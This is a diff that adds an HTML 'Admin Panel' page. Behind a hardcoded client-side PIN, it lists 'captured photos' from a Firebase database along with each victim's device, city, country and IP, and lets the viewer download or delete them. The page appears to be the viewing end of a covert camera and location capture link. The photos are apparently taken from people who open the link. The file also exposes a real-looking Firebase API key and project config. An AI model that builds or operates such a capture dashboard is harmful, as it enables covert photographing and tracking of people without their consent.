@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', sans-serif;
+    background: #0f0f0f;
+    color: #e0e0e0;
+    min-height: 100vh;
+  }
+
+  /* PIN Screen */
+  #pinScreen {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    background: #0f0f0f;
+  }
+  .pin-box {
+    background: #1a1a1a;
+    border: 1px solid #333;
+    border-radius: 16px;
+    padding: 2.5rem;
+    text-align: center;
+    width: 320px;
+  }
+  .pin-box .lock { font-size: 48px; margin-bottom: 1rem; }
+  .pin-box h2 { margin-bottom: 0.5rem; color: #fff; }
+  .pin-box p { font-size: 0.85rem; color: #888; margin-bottom: 1.5rem; }
+  .pin-input {
+    width: 100%;
+    background: #111;
+    border: 1px solid #444;
+    color: #fff;
+    padding: 12px 16px;
+    border-radius: 8px;
+    font-size: 1.2rem;
+    text-align: center;
+    letter-spacing: 6px;
+    margin-bottom: 1rem;
+    outline: none;
+  }
+  .pin-input:focus { border-color: #7c3aed; }
+  .pin-btn {
+    width: 100%;
+    background: #7c3aed;
+    color: white;
+    border: none;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .pin-btn:hover { background: #6d28d9; }
+  .pin-error { color: #f87171; font-size: 0.85rem; margin-top: 0.75rem; display: none; }
+
+  /* Dashboard */
+  #dashboard { display: none; }
+  .topbar {
+    background: #1a1a1a;
+    border-bottom: 1px solid #333;
+    padding: 1rem 1.5rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .topbar h1 { font-size: 1.2rem; color: #fff; }
+  .topbar .stats { font-size: 0.85rem; color: #888; }
+  .logout-btn {
+    background: #333;
+    color: #ccc;
+    border: none;
+    padding: 6px 16px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 0.85rem;
+  }
+  .logout-btn:hover { background: #444; }
+
+  .content { padding: 1.5rem; }
+
+  .filter-bar {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+  .filter-bar select, .filter-bar input {
+    background: #1a1a1a;
+    border: 1px solid #333;
+    color: #ccc;
+    padding: 8px 12px;
+    border-radius: 8px;
+    font-size: 0.85rem;
+    outline: none;
+  }
+  .delete-all-btn {
+    background: #7f1d1d;
+    color: #fca5a5;
+    border: none;
+    padding: 8px 14px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 0.85rem;
+    margin-left: auto;
+  }
+  .delete-all-btn:hover { background: #991b1b; }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 1rem;
+  }
+
+  .card {
+    background: #1a1a1a;
+    border: 1px solid #2a2a2a;
+    border-radius: 12px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .card:hover { border-color: #444; }
+  .card img {
+    width: 100%;
+    height: 200px;
+    object-fit: cover;
+    background: #111;
+  }
+  .card .no-photo {
+    width: 100%;
+    height: 200px;
+    background: #111;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 2.5rem;
+    color: #444;
+  }
+  .card-info { padding: 0.75rem 1rem; }
+  .card-info .time { font-size: 0.8rem; color: #7c3aed; font-weight: 600; margin-bottom: 0.4rem; }
+  .card-info .meta { font-size: 0.78rem; color: #666; line-height: 1.6; }
+  .card-info .device-badge {
+    display: inline-block;
+    background: #1e293b;
+    color: #7dd3fc;
+    font-size: 0.7rem;
+    padding: 2px 8px;
+    border-radius: 4px;
+    margin-bottom: 0.4rem;
+  }
+  .card-actions {
+    padding: 0.5rem 1rem 0.75rem;
+    display: flex;
+    gap: 8px;
+  }
+  .dl-btn {
+    flex: 1;
+    background: #1e3a2f;
+    color: #4ade80;
+    border: none;
+    padding: 7px;
+    border-radius: 7px;
+    font-size: 0.78rem;
+    cursor: pointer;
+  }
+  .dl-btn:hover { background: #14532d; }
+  .del-btn {
+    background: #3b1a1a;
+    color: #f87171;
+    border: none;
+    padding: 7px 12px;
+    border-radius: 7px;
+    font-size: 0.78rem;
+    cursor: pointer;
+  }
+  .del-btn:hover { background: #7f1d1d; }
+
+  .empty-state {
+    text-align: center;
+    padding: 4rem 2rem;
+    color: #555;
+  }
+  .empty-state .icon { font-size: 3rem; margin-bottom: 1rem; }
+
+  .loading {
+    text-align: center;
+    padding: 3rem;
+    color: #555;
+  }
+</style>
+</head>
+<body>
+
+<!-- PIN Screen -->
+<div id="pinScreen">
+  <div class="pin-box">
+    <div class="lock">🔐</div>
+    <h2>Admin Access</h2>
+    <p>Enter PIN to view captured photos</p>
+    <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" onkeydown="if(event.key==='Enter') checkPin()">
+    <button class="pin-btn" onclick="checkPin()">Unlock</button>
+    <div class="pin-error" id="pinError">❌ Wrong PIN. Try again.</div>
+  </div>
+</div>
+
+<!-- Dashboard -->
+<div id="dashboard">
+  <div class="topbar">
+    <h1>📸 Captured Photos</h1>
+    <div class="stats" id="statsText">Loading...</div>
+    <button class="logout-btn" onclick="logout()">🔒 Lock</button>
+  </div>
+  <div class="content">
+    <div class="filter-bar">
+      <select id="deviceFilter" onchange="renderCards()">
+        <option value="all">All Devices</option>
+        <option value="Mobile">Mobile</option>
+        <option value="Desktop">Desktop</option>
+      </select>
+      <input type="text" id="searchInput" placeholder="Search by city / country..." oninput="renderCards()" style="width:220px">
+      <button class="delete-all-btn" onclick="deleteAll()">🗑 Delete All</button>
+    </div>
+    <div class="grid" id="grid">
+      <div class="loading">Loading captures...</div>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, onValue, remove, child } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+  const ADMIN_PIN = "1234"; // ← APNA PIN YAHAN BADLO
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyD2drTPEiYfj97Er4S_PyPQuRsTyFafYcU",
+    authDomain: "link-d89e2.firebaseapp.com",
+    databaseURL: "https://link-d89e2-default-rtdb.firebaseio.com",
+    projectId: "link-d89e2",
+    storageBucket: "link-d89e2.firebasestorage.app",
+    messagingSenderId: "110029965870",
+    appId: "1:110029965870:web:6ff5813190bbb2bfd46dbf"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  let allData = {};
+
+  window.checkPin = function() {
+    const input = document.getElementById('pinInput').value;
+    if (input === ADMIN_PIN) {
+      document.getElementById('pinScreen').style.display = 'none';
+      document.getElementById('dashboard').style.display = 'block';
+      loadData();
+    } else {
+      document.getElementById('pinError').style.display = 'block';
+      document.getElementById('pinInput').value = '';
+      document.getElementById('pinInput').focus();
+    }
+  };
+
+  window.logout = function() {
+    document.getElementById('pinScreen').style.display = 'flex';
+    document.getElementById('dashboard').style.display = 'none';
+    document.getElementById('pinInput').value = '';
+  };
+
+  function loadData() {
+    const capturesRef = ref(db, 'captures');
+    onValue(capturesRef, (snapshot) => {
+      allData = snapshot.val() || {};
+      renderCards();
+    });
+  }
+
+  window.renderCards = function() {
+    const grid = document.getElementById('grid');
+    const deviceFilter = document.getElementById('deviceFilter').value;
+    const search = document.getElementById('searchInput').value.toLowerCase();
+
+    const entries = Object.entries(allData)
+      .filter(([id, d]) => {
+        if (deviceFilter !== 'all' && d.device !== deviceFilter) return false;
+        if (search) {
+          const str = `${d.city} ${d.country} ${d.ip}`.toLowerCase();
+          if (!str.includes(search)) return false;
+        }
+        return true;
+      })
+      .sort((a, b) => new Date(b[1].timestamp) - new Date(a[1].timestamp));
+
+    document.getElementById('statsText').textContent = `${Object.keys(allData).length} total captures`;
+
+    if (entries.length === 0) {
+      grid.innerHTML = `<div class="empty-state" style="grid-column:1/-1"><div class="icon">📭</div><p>No captures yet</p></div>`;
+      return;
+    }
+
+    grid.innerHTML = entries.map(([id, d]) => {
+      const date = new Date(d.timestamp);
+      const timeStr = date.toLocaleDateString('en-IN', { day:'2-digit', month:'short', year:'numeric' })
+                    + ' ' + date.toLocaleTimeString('en-IN', { hour:'2-digit', minute:'2-digit' });
+      return `
+        <div class="card">
+          ${d.photo
+            ? `<img src="${d.photo}" alt="capture" loading="lazy">`
+            : `<div class="no-photo">📵</div>`
+          }
+          <div class="card-info">
+            <div class="time">${timeStr}</div>
+            <span class="device-badge">${d.device || 'Unknown'}</span>
+            <div class="meta">
+              🌍 ${d.city || '?'}, ${d.country || '?'}<br>
+              🌐 IP: ${d.ip || '?'}
+            </div>
+          </div>
+          <div class="card-actions">
+            ${d.photo ? `<button class="dl-btn" onclick="downloadPhoto('${id}')">⬇ Download</button>` : '<button class="dl-btn" disabled style="opacity:0.4">No Photo</button>'}
+            <button class="del-btn" onclick="deleteCapture('${id}')">🗑</button>
+          </div>
+        </div>
+      `;
+    }).join('');
+  };
+
+  window.downloadPhoto = function(id) {
+    const d = allData[id];
+    if (!d || !d.photo) return;
+    const a = document.createElement('a');
+    a.href = d.photo;
+    a.download = `capture_${id}.jpg`;
+    a.click();
+  };
+
+  window.deleteCapture = async function(id) {
+    if (!confirm('Delete this capture?')) return;
+    await remove(ref(db, `captures/${id}`));
+  };
+
+  window.deleteAll = async function() {
+    if (!confirm('Delete ALL captures? This cannot be undone!')) return;
+    await remove(ref(db, 'captures'));
+  };
+</script>
+
+</body>
+</html>
